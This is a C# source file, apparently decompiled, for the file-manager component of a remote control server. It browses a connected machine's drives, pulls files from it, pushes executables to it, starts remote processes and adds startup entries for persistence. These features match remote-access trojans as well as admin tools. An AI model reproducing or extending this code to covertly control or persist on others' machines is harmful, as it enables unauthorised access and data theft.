

using InvokedCommon.Enums;
using InvokedCommon.IO;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using InvokedServer.Enums;
using InvokedServer.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;


namespace InvokedServer.Messages
{
	public class FileManagerHandler : MessageProcessorBase<string>, IDisposable
	{
		private readonly List<FileTransfer> _activeFileTransfers = new List<FileTransfer>();
		private readonly object _syncLock = new object();
		private readonly InvokedServer.Networking.Client _client;
		private readonly Semaphore _limitThreads = new Semaphore(2, 2);
		private readonly string _baseDownloadPath;
		private readonly TaskManagerHandler _taskManagerHandler;

		public event FileManagerHandler.DrivesChangedEventHandler DrivesChanged;

		public event FileManagerHandler.DirectoryChangedEventHandler DirectoryChanged;

		public event FileManagerHandler.FileTransferUpdatedEventHandler FileTransferUpdated;

		private void OnDrivesChanged(Drive[] drives)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(d =>
			{
				FileManagerHandler.DrivesChangedEventHandler drivesChanged = this.DrivesChanged;
				if (drivesChanged == null)
					return;
				drivesChanged((object)this, (Drive[])d);
			}), (object)drives);
		}

		private void OnDirectoryChanged(string remotePath, FileSystemEntry[] items)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(i =>
			{
				FileManagerHandler.DirectoryChangedEventHandler directoryChanged = this.DirectoryChanged;
				if (directoryChanged == null)
					return;
				directoryChanged((object)this, remotePath, (FileSystemEntry[])i);
			}), (object)items);
		}

		private void OnFileTransferUpdated(FileTransfer transfer)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(t =>
			{
				FileManagerHandler.FileTransferUpdatedEventHandler fileTransferUpdated = this.FileTransferUpdated;
				if (fileTransferUpdated == null)
					return;
				fileTransferUpdated((object)this, (FileTransfer)t);
			}), (object)transfer.Clone());
		}

		public FileManagerHandler(InvokedServer.Networking.Client client, string subDirectory = "")
		  : base(true)
		{
			this._client = client;
			this._baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
			this._taskManagerHandler = new TaskManagerHandler(client);
			this._taskManagerHandler.ProcessActionPerformed += new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
			MessageHandler.Register((IMessageProcessor)this._taskManagerHandler);
		}

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case FileTransferChunk _:
				case FileTransferCancel _:
				case FileTransferComplete _:
				case GetDrivesResponse _:
				case GetDirectoryResponse _:
					return true;
				default:
					return message is SetStatusFileManager;
			}
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.PEquals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case FileTransferChunk message1:
					this.Execute(sender, message1);
					break;
				case FileTransferCancel message2:
					this.Execute(sender, message2);
					break;
				case FileTransferComplete message3:
					this.Execute(sender, message3);
					break;
				case GetDrivesResponse message4:
					this.Execute(sender, message4);
					break;
				case GetDirectoryResponse message5:
					this.Execute(sender, message5);
					break;
				case SetStatusFileManager message6:
					this.Execute(sender, message6);
					break;
			}
		}

		public void BeginDownloadFile(string remotePath, string localFileName = "", bool overwrite = false)
		{
			if (string.IsNullOrEmpty(remotePath))
				return;
			int uniqueFileTransferId = this.GetUniqueFileTransferId();
			if (!Directory.Exists(this._baseDownloadPath))
				Directory.CreateDirectory(this._baseDownloadPath);
			string path = Path.Combine(this._baseDownloadPath, string.IsNullOrEmpty(localFileName) ? Path.GetFileName(remotePath) : localFileName);
			int num = 1;
			while (!overwrite && File.Exists(path))
			{
				path = Path.Combine(this._baseDownloadPath, string.Format("{0}({1}){2}", (object)Path.GetFileNameWithoutExtension(path), (object)num, (object)Path.GetExtension(path)));
				++num;
			}
			FileTransfer transfer = new FileTransfer()
			{
				Id = uniqueFileTransferId,
				Type = TransferType.Download,
				LocalPath = path,
				RemotePath = remotePath,
				Status = "Pending...",
				TransferredSize = 0
			};
			try
			{
				transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
			}
			catch
			{
				transfer.Status = "Error writing file";
				this.OnFileTransferUpdated(transfer);
				return;
			}
			lock (this._syncLock)
				this._activeFileTransfers.Add(transfer);
			this.OnFileTransferUpdated(transfer);
			this._client.Send<FileTransferRequest>(new FileTransferRequest()
			{
				RemotePath = remotePath,
				Id = uniqueFileTransferId
			});
		}

		public void BeginUploadFile(string localPath, string remotePath = "", string fileExtension = "exe")
		{
			new Thread((ThreadStart)(() =>
			{
				int uniqueFileTransferId = this.GetUniqueFileTransferId();
				FileTransfer transfer = new FileTransfer()
				{
					Id = uniqueFileTransferId,
					Type = TransferType.Upload,
					LocalPath = localPath,
					RemotePath = remotePath,
					Status = "Pending...",
					TransferredSize = 0
				};
				try
				{
					transfer.FileSplit = new FileSplit(localPath, FileAccess.Read);
				}
				catch
				{
					transfer.Status = "Error reading file";
					this.OnFileTransferUpdated(transfer);
					return;
				}
				transfer.Size = transfer.FileSplit.FileSize;
				lock (this._syncLock)
					this._activeFileTransfers.Add(transfer);
				transfer.Size = transfer.FileSplit.FileSize;
				this.OnFileTransferUpdated(transfer);
				this._limitThreads.WaitOne();
				try
				{
					foreach (FileChunk fileChunk in transfer.FileSplit)
					{
						transfer.TransferredSize += (long)fileChunk.Data.Length;
						Decimal num = transfer.Size == 0L ? 100M : Math.Round((Decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
						transfer.Status = string.Format("Uploading...({0}%)", (object)num);
						this.OnFileTransferUpdated(transfer);
						bool flag;
						lock (this._syncLock)
							flag = this._activeFileTransfers.Count<FileTransfer>((Func<FileTransfer, bool>)(f => f.Id == transfer.Id)) == 0;
						if (flag)
						{
							transfer.Status = "Canceled";
							this.OnFileTransferUpdated(transfer);
							this._limitThreads.Release();
							return;
						}
						this._client.SendBlocking<FileTransferChunk>(new FileTransferChunk()
						{
							Id = uniqueFileTransferId,
							Chunk = fileChunk,
							FilePath = remotePath,
							FileSize = transfer.Size,
							FileExtension = fileExtension
						});
					}
				}
				catch
				{
					lock (this._syncLock)
					{
						if (this._activeFileTransfers.Count<FileTransfer>((Func<FileTransfer, bool>)(f => f.Id == transfer.Id)) == 0)
						{
							this._limitThreads.Release();
							return;
						}
					}
					transfer.Status = "Error reading file";
					this.OnFileTransferUpdated(transfer);
					this.CancelFileTransfer(transfer.Id);
					this._limitThreads.Release();
					return;
				}
				this._limitThreads.Release();
			})).Start();
		}

		public void CancelFileTransfer(int transferId)
		{
			this._client.Send<FileTransferCancel>(new FileTransferCancel()
			{
				Id = transferId
			});
		}

		public void RenameFile(string remotePath, string newPath, FileType type)
		{
			this._client.Send<DoPathRename>(new DoPathRename()
			{
				Path = remotePath,
				NewPath = newPath,
				PathType = type
			});
		}

		public void DeleteFile(string remotePath, FileType type)
		{
			this._client.Send<DoPathDelete>(new DoPathDelete()
			{
				Path = remotePath,
				PathType = type
			});
		}

		public void StartProcess(string remotePath)
		{
			this._taskManagerHandler.StartProcess(remotePath);
		}

		public void AddToStartup(StartupItem item)
		{
			this._client.Send<DoStartupItemAdd>(new DoStartupItemAdd()
			{
				StartupItem = item
			});
		}

		public void GetDirectoryContents(string remotePath)
		{
			this._client.Send<GetDirectory>(new GetDirectory()
			{
				RemotePath = remotePath
			});
		}

		public void RefreshDrives() => this._client.Send<GetDrives>(new GetDrives());

		private void Execute(ISender client, FileTransferChunk message)
		{
			FileTransfer transfer;
			lock (this._syncLock)
				transfer = this._activeFileTransfers.FirstOrDefault<FileTransfer>((Func<FileTransfer, bool>)(t => t.Id == message.Id));
			if (transfer == (FileTransfer)null)
				return;
			transfer.Size = message.FileSize;
			transfer.TransferredSize += (long)message.Chunk.Data.Length;
			try
			{
				transfer.FileSplit.WriteChunk(message.Chunk);
			}
			catch
			{
				transfer.Status = "Error writing file";
				this.OnFileTransferUpdated(transfer);
				this.CancelFileTransfer(transfer.Id);
				return;
			}
			Decimal num = transfer.Size == 0L ? 100M : Math.Round((Decimal)((double)transfer.TransferredSize / (double)transfer.Size * 100.0), 2);
			transfer.Status = string.Format("Downloading...({0}%)", (object)num);
			this.OnFileTransferUpdated(transfer);
		}

		private void Execute(ISender client, FileTransferCancel message)
		{
			FileTransfer transfer;
			lock (this._syncLock)
				transfer = this._activeFileTransfers.FirstOrDefault<FileTransfer>((Func<FileTransfer, bool>)(t => t.Id == message.Id));
			if (!(transfer != (FileTransfer)null))
				return;
			transfer.Status = message.Reason;
			this.OnFileTransferUpdated(transfer);
			this.RemoveFileTransfer(transfer.Id);
			if (transfer.Type != TransferType.Download)
				return;
			File.Delete(transfer.LocalPath);
		}

		private void Execute(ISender client, FileTransferComplete message)
		{
			FileTransfer transfer;
			lock (this._syncLock)
				transfer = this._activeFileTransfers.FirstOrDefault<FileTransfer>((Func<FileTransfer, bool>)(t => t.Id == message.Id));
			if (!(transfer != (FileTransfer)null))
				return;
			transfer.RemotePath = message.FilePath;
			transfer.Status = "Completed";
			this.RemoveFileTransfer(transfer.Id);
			this.OnFileTransferUpdated(transfer);
		}

		private void Execute(ISender client, GetDrivesResponse message)
		{
			Drive[] drives = message.Drives;
			if ((drives != null ? (drives.Length == 0 ? 1 : 0) : 0) != 0)
				return;
			this.OnDrivesChanged(message.Drives);
		}

		private void Execute(ISender client, GetDirectoryResponse message)
		{
			if (message.Items == null)
				message.Items = new FileSystemEntry[0];
			this.OnDirectoryChanged(message.RemotePath, message.Items);
		}

		private void Execute(ISender client, SetStatusFileManager message)
		{
			this.OnReport(message.Message);
		}

		private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
		{
			if (action != ProcessAction.Start)
				return;
			this.OnReport(result ? "Process started successfully" : "Process failed to start");
		}

		private void RemoveFileTransfer(int transferId)
		{
			lock (this._syncLock)
			{
				this._activeFileTransfers.FirstOrDefault<FileTransfer>((Func<FileTransfer, bool>)(t => t.Id == transferId))?.FileSplit?.Dispose();
				this._activeFileTransfers.RemoveAll((Predicate<FileTransfer>)(s => s.Id == transferId));
			}
		}

		private int GetUniqueFileTransferId()
		{
			int id;
			lock (this._syncLock)
			{
				do
				{
					id = FileTransfer.GetRandomTransferId();
				}
				while (this._activeFileTransfers.Any<FileTransfer>((Func<FileTransfer, bool>)(f => f.Id == id)));
			}
			return id;
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			lock (this._syncLock)
			{
				foreach (FileTransfer activeFileTransfer in this._activeFileTransfers)
				{
					this._client.Send<FileTransferCancel>(new FileTransferCancel()
					{
						Id = activeFileTransfer.Id
					});
					activeFileTransfer.FileSplit?.Dispose();
					if (activeFileTransfer.Type == TransferType.Download)
						File.Delete(activeFileTransfer.LocalPath);
				}
				this._activeFileTransfers.Clear();
			}
			MessageHandler.Unregister((IMessageProcessor)this._taskManagerHandler);
			this._taskManagerHandler.ProcessActionPerformed -= new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
		}

		public delegate void DrivesChangedEventHandler(object sender, Drive[] drives);

		public delegate void DirectoryChangedEventHandler(
		  object sender,
		  string remotePath,
		  FileSystemEntry[] items);

		public delegate void FileTransferUpdatedEventHandler(object sender, FileTransfer transfer);
	}
}